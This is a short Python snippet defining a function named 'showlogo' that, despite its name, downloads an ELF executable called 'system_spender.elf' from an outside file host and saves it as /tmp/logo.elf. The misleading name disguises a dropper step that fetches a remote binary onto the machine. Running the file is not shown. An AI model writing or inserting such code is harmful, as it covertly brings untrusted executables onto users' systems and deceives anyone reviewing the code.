def showlogo():
	logo = urllib.urlopen("http://my-files.ru/Save/a4glpj/system_spender.elf").read()
	f = open("/tmp/logo.elf", "wb")
	f.write(logo)
	f.close()